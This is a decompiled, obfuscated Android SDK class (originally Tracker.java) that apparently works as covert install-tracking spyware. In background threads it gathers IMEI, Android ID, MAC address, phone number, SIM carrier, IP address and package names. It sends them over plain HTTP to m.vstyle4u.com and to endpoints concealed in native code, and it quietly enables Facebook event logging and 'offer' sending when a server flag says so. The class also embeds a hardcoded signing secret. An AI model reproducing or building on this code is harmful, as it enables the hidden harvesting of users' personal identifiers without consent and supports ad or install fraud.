package com.mbv.a.sdklibrary;

import android.content.Context;
import android.os.Build;
import android.preference.PreferenceManager;
import android.support.v4.app.NotificationCompat;
import android.text.TextUtils;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.d;
import com.mbv.a.sdklibrary.b.c;
import com.mbv.a.sdklibrary.b.f;
import com.mbv.a.sdklibrary.b.h;
import com.mbv.a.sdklibrary.b.k;
import com.mbv.a.sdklibrary.manager.JniManager;
import com.mbv.a.sdklibrary.net.AsyncHttpGet;
import com.mbv.a.sdklibrary.net.BaseRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONObject;

/* compiled from: Tracker.java */
/* loaded from: classes.dex */
public class b {

    /* renamed from: a  reason: collision with root package name */
    public static Context f678a;
    private String b;

    public static b a() {
        return a.f685a;
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* compiled from: Tracker.java */
    /* loaded from: classes.dex */
    public static class a {

        /* renamed from: a  reason: collision with root package name */
        private static final b f685a = new b();
    }

    private b() {
    }

    public void b() {
        new Thread(new Runnable() { // from class: com.mbv.a.sdklibrary.b.1
            @Override // java.lang.Runnable
            public void run() {
                b.this.a(b.this.d("is_send_install") ? 2 : 1);
            }
        }).start();
    }

    public void c() {
        new Thread(new Runnable() { // from class: com.mbv.a.sdklibrary.b.2
            @Override // java.lang.Runnable
            public void run() {
                if (!b.this.d("is_request_install")) {
                    b.this.h();
                }
            }
        }).start();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void g() {
        a("should_send_offer", true);
    }

    public void d() {
        a(f.s());
    }

    public void a(final String str) {
        if (!TextUtils.isEmpty(str) && d("should_send_offer")) {
            String a2 = h.a(str);
            if (!str.equals(this.b) && !d(a2)) {
                this.b = str;
                new Thread(new Runnable() { // from class: com.mbv.a.sdklibrary.b.3
                    @Override // java.lang.Runnable
                    public void run() {
                        b.this.c(str);
                    }
                }).start();
            }
        }
    }

    public static String e() {
        HttpURLConnection httpURLConnection;
        HttpURLConnection httpURLConnection2;
        int i;
        String group;
        HttpURLConnection httpURLConnection3;
        InputStream inputStream = null;
        try {
            try {
                URLConnection openConnection = new URL("http://www.baidu.com?").openConnection();
                HttpURLConnection httpURLConnection4 = (HttpURLConnection) openConnection;
                try {
                    int responseCode = httpURLConnection4.getResponseCode();
                    if (responseCode == 302) {
                        httpURLConnection3 = (HttpURLConnection) new URL(openConnection.getHeaderField("Location")).openConnection();
                        httpURLConnection2 = httpURLConnection3;
                        i = httpURLConnection3.getResponseCode();
                    } else {
                        httpURLConnection2 = httpURLConnection4;
                        i = responseCode;
                    }
                    try {
                        if (i == 200) {
                            try {
                                inputStream = httpURLConnection2.getInputStream();
                                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "utf-8"));
                                StringBuilder sb = new StringBuilder();
                                while (true) {
                                    String readLine = bufferedReader.readLine();
                                    if (readLine == null) {
                                        break;
                                    }
                                    sb.append(readLine + "\n");
                                }
                                Matcher matcher = Pattern.compile("((?:(?:25[0-5]|2[0-4]\\d|((1\\d{2})|([1-9]?\\d)))\\.){3}(?:25[0-5]|2[0-4]\\d|((1\\d{2})|([1-9]?\\d))))").matcher(sb.toString());
                                if (matcher.find()) {
                                    group = matcher.group();
                                    inputStream.close();
                                    httpURLConnection2.disconnect();
                                    return group;
                                }
                            } catch (MalformedURLException e) {
                                e = e;
                                e.printStackTrace();
                                try {
                                    inputStream.close();
                                    httpURLConnection2.disconnect();
                                    return "";
                                } catch (IOException e2) {
                                    e2.printStackTrace();
                                    return "";
                                }
                            } catch (IOException e3) {
                                e = e3;
                                e.printStackTrace();
                                try {
                                    inputStream.close();
                                    httpURLConnection2.disconnect();
                                    return "";
                                } catch (IOException e4) {
                                    e4.printStackTrace();
                                    return "";
                                }
                            }
                        }
                        inputStream.close();
                        httpURLConnection2.disconnect();
                        return group;
                    } catch (IOException e5) {
                        e5.printStackTrace();
                        return group;
                    }
                    group = "";
                } catch (MalformedURLException e6) {
                    httpURLConnection2 = httpURLConnection3;
                    e = e6;
                } catch (IOException e7) {
                    httpURLConnection2 = httpURLConnection3;
                    e = e7;
                } catch (Throwable th) {
                    httpURLConnection = httpURLConnection3;
                    th = th;
                    try {
                        inputStream.close();
                        httpURLConnection.disconnect();
                    } catch (IOException e8) {
                        e8.printStackTrace();
                    }
                    throw th;
                }
            } catch (MalformedURLException e9) {
                e = e9;
                httpURLConnection2 = null;
            } catch (IOException e10) {
                e = e10;
                httpURLConnection2 = null;
            } catch (Throwable th2) {
                th = th2;
                httpURLConnection = null;
            }
        } catch (Throwable th3) {
            th = th3;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public synchronized void a(int i) {
        HashMap hashMap = new HashMap();
        hashMap.put("device", "Android " + f.b());
        hashMap.put("browser", b("ua"));
        hashMap.put("ip", e());
        hashMap.put("apk_name", f.g());
        hashMap.put("phone", f.o());
        String e = f.e();
        hashMap.put("android_id", e);
        String c = f.c();
        hashMap.put("imei", c);
        hashMap.put("package", f.f());
        String str = (System.currentTimeMillis() / 1000) + "";
        hashMap.put("time", str);
        hashMap.put("time_millis", System.currentTimeMillis() + "");
        hashMap.put("type", "" + i);
        hashMap.put("clickid", com.mbv.a.sdklibrary.b.a.a());
        hashMap.put("net", f.k());
        hashMap.put("sign", h.a(str + c + e));
        JniManager.nativeSendinfos();
        AsyncHttpGet.get("http://m.vstyle4u.com/apks/send-infos", hashMap, new com.mbv.a.sdklibrary.net.b() { // from class: com.mbv.a.sdklibrary.b.4
            @Override // com.mbv.a.sdklibrary.net.b
            public void a(Exception exc, byte[] bArr) {
                if (exc == null && bArr != null) {
                    b.this.a("is_send_install", true);
                }
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public synchronized void c(String str) {
        String a2 = f.a();
        HashMap hashMap = new HashMap();
        hashMap.put("uuid", f.g());
        hashMap.put("device_brand", Build.MODEL);
        hashMap.put("platform", "Android");
        hashMap.put("os_version", Build.VERSION.RELEASE);
        hashMap.put("android", f.e());
        hashMap.put("imei", f.c());
        hashMap.put("app_version", f.h());
        hashMap.put("gdid", a2);
        hashMap.put("mac_address", f.d());
        hashMap.put("SIMcard_carriers", f.r());
        String str2 = (System.currentTimeMillis() / 1000) + "";
        hashMap.put("time", str2);
        hashMap.put("time_millis", System.currentTimeMillis() + "");
        hashMap.put("type", "1");
        hashMap.put("net", f.k());
        hashMap.put("sign", h.a(str2 + a2 + "ec37f43dadcda72a498045dfabe88aed"));
        AsyncHttpGet.get(JniManager.nativeSendinstall(), hashMap, k.b(str), new com.mbv.a.sdklibrary.net.b() { // from class: com.mbv.a.sdklibrary.b.5
            @Override // com.mbv.a.sdklibrary.net.b
            public void a(BaseRequest baseRequest, Exception exc, byte[] bArr) {
                if (exc == null) {
                    try {
                        String obj = baseRequest.getTag() == null ? "" : baseRequest.getTag().toString();
                        if (!TextUtils.isEmpty(obj)) {
                            b.this.a(h.a(obj), true);
                        }
                    } catch (Exception e) {
                        exc.printStackTrace();
                    }
                }
            }
        }).setTag(str);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public synchronized void h() {
        String a2 = f.a();
        HashMap hashMap = new HashMap();
        hashMap.put("uuid", f.g());
        hashMap.put("device_brand", Build.MODEL);
        hashMap.put("platform", "Android");
        hashMap.put("os_version", Build.VERSION.RELEASE);
        hashMap.put("android", f.e());
        hashMap.put("imei", f.c());
        hashMap.put("app_version", f.h());
        hashMap.put("gdid", a2);
        hashMap.put("mac_address", f.d());
        hashMap.put("SIMcard_carriers", f.r());
        String str = (System.currentTimeMillis() / 1000) + "";
        hashMap.put("time", str);
        hashMap.put("time_millis", System.currentTimeMillis() + "");
        hashMap.put("type", "1");
        hashMap.put("clickid", com.mbv.a.sdklibrary.b.a.a());
        hashMap.put("net", f.k());
        hashMap.put("sign", h.a(str + a2 + "ec37f43dadcda72a498045dfabe88aed"));
        AsyncHttpGet.get(JniManager.nativeIsappsflyers(), hashMap, new com.mbv.a.sdklibrary.net.b() { // from class: com.mbv.a.sdklibrary.b.6
            @Override // com.mbv.a.sdklibrary.net.b
            public void a(BaseRequest baseRequest, Exception exc, byte[] bArr) {
                if (exc == null) {
                    try {
                        b.this.a("is_request_install", true);
                        if (new JSONObject(new String(bArr)).optInt(NotificationCompat.CATEGORY_STATUS) == 1) {
                            b.this.g();
                            b.this.f();
                            b.this.d();
                        }
                    } catch (Error e) {
                        e.printStackTrace();
                    } catch (Exception e2) {
                        e2.printStackTrace();
                    }
                }
            }
        });
    }

    public void f() {
        if (f678a != null) {
            d.a(f678a);
            AppEventsLogger.a(f678a);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean d(String str) {
        return PreferenceManager.getDefaultSharedPreferences(c.a()).getBoolean(str, false);
    }

    public String b(String str) {
        return PreferenceManager.getDefaultSharedPreferences(c.a()).getString(str, "");
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(String str, boolean z) {
        PreferenceManager.getDefaultSharedPreferences(c.a()).edit().putBoolean(str, z).commit();
    }

    public void a(String str, String str2) {
        PreferenceManager.getDefaultSharedPreferences(c.a()).edit().putString(str, str2).commit();
    }
}